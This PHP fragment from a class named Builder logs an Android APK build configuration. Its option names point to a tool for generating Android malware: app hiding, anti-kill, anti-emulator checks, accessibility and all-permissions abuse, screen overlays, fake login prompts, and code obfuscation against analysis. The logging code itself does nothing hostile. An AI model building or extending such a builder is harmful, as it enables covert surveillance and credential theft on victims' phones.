...
class Builder
{
     ...
     * 记录构建配置参数
     */
    private function logBuildConfig(ApkBuildConfig $config): void
    {
        $this->logger->log("--- Build Configuration ---");
        $this->logger->log("  appid: {$config->appid}");
        $this->logger->log("  userid: {$config->userid}");
        $this->logger->log("  appname: {$config->appname}");
        $this->logger->log("  appversion: {$config->appversion}");
        $this->logger->log("  clientname: {$config->clientname}");
        $this->logger->log("  buildType: {$config->buildType}");
        $this->logger->log("  UserHost: {$config->UserHost}");
        $this->logger->log("  appurl: {$config->appurl}");
        $this->logger->log("  appicopath: {$config->appicopath}");
        $this->logger->log("  noEmulator (background): {$config->noEmulator}");
        $this->logger->log("  useAccess: {$config->useAccess}");
        $this->logger->log("  useAntkill: {$config->useAntkill}");
        $this->logger->log("  useAtoprims: {$config->useAtoprims}");
        $this->logger->log("  userAllprims: {$config->userAllprims}");
        $this->logger->log("  userBlackprims: {$config->userBlackprims}");
        $this->logger->log("  hiddenApp: {$config->hiddenApp}");
        $this->logger->log("  hideType: {$config->hideType}");
        $this->logger->log("  installType: {$config->installType}");
        $this->logger->log("  useDraw: {$config->useDraw}");
        $this->logger->log("  openAccess: {$config->openAccess}");
        $this->logger->log("  diaoType: {$config->diaoType}");
        $this->logger->log("  loginTitle: {$config->loginTitle}");
        $this->logger->log("  loginDis: {$config->loginDis}");
        $this->logger->log("  loginBtn: {$config->loginBtn}");
        $this->logger->log("  notifyTitle: {$config->notifyTitle}");
        $this->logger->log("  notifyMsg: {$config->notifyMsg}");
        $this->logger->log("  lngShort: " . (strlen($config->lngShort) > 50 ? substr($config->lngShort, 0, 50) . '...' : $config->lngShort));
        $this->logger->log("  description: {$config->description}");
        $this->logger->log("  mainActivity: {$config->mainActivity}");
        $this->logger->log("  appFolder: {$config->appFolder}");
        $this->logger->log("  email: " . (strlen($config->email) > 20 ? substr($config->email, 0, 20) . '...' : $config->email));
        $this->logger->log("--- Protection Settings ---");
        $this->logger->log("  enableJunkClasses: " . ($config->enableJunkClasses ? 'true' : 'false'));
        $this->logger->log("  enableClassShuffle: " . ($config->enableClassShuffle ? 'true' : 'false'));
        $this->logger->log("  enableApkProtection: " . ($config->enableApkProtection ? 'true' : 'false'));
        $this->logger->log("  enableDexModification: " . ($config->enableDexModification ? 'true' : 'false'));
        $this->logger->log("---------------------------");
    }
